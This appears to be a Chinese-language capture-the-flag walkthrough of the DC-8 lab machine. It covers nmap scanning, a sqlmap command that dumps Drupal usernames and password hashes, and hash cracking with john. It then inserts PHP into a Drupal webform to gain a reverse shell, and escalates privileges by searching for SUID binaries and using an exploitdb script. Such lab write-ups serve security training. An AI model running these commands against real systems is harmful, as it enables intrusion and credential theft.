# DC8 
## 简述  
使用sql注入得到其中的用户名密码，解密密码，写shell,提权  

## 服务发现和漏洞利用  
```
nmap 192.168.1.*  
nmap -A  -p 1-65535 192.168.1.56 
```
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201172054.png)  
开启了80和22端口  
打开网页服务发现其中存在sql漏洞  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201172208.png)
```
使用sqlmap进行！ --dump选项能有很大作用要记得使用
sqlmap --url "http://192.168.1.56/?nid=1" -p nid -D d7db -T users -C name,pass --dump
```
![20191130200226.png](https://i.loli.net/2019/11/30/iADKhSNgC2wZoeB.png)  
现在得到了数据的用户名和密码，我们可以使用john对数据进行破解   
这里存在一个坑一直存在no passwords，可以使用hash 密码 --show 进行显示
![20191130205526.png](https://i.loli.net/2019/11/30/RjSXbdVaIxl3FeJ.png)  
然后使用john用户登录  ，drupal反射shell    
### 如何在drupal当中反射shell  

![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201190604.png)  
发现其中的登录页面，登录上去  
探测到版本是durpal 7.x 系列的那样的话就简单多了
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201191309.png)
```
drupal 7 上传的步骤  
configuration-》Webform-》Form settings -》 其中插入php代码
```
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201192740.png)

## 提权 
发表评论之后会返回shell权限  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201193240.png)  
![20191130210638.png](https://i.loli.net/2019/11/30/GxkZHijCSaguBJp.png)  
```
python -c 'import pty;pty.spawn("/bin/bash")'

 find / -perm -u=s -type f 2>/dev/null  
```
直接在exploitdb当中搜索使用就行了

![20191130210954.png](https://i.loli.net/2019/11/30/w5BHKVoZapGXyCv.png)
放到linux服务器当中让服务器进行下载该文件   
```
本地开启了apache服务
```
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201195552.png)
注意点 当一种提权脚本不能进行使用的时候可以使用另外一种的提权的选项到提权  
## 总结  
简单的sql注入获得网站的用户和密码，写一个shell到页面当中收到一个简单的shell  
使用其中的一款存在权限提升的软件进行提权 最终获得成功  
### 操作  
drupal上传shell  
获取交互式shell  python -c 'import pty;pty.spawn("/bin/bash")'
寻找特权指令  find / -perm -u=s -type f 2>/dev/null  




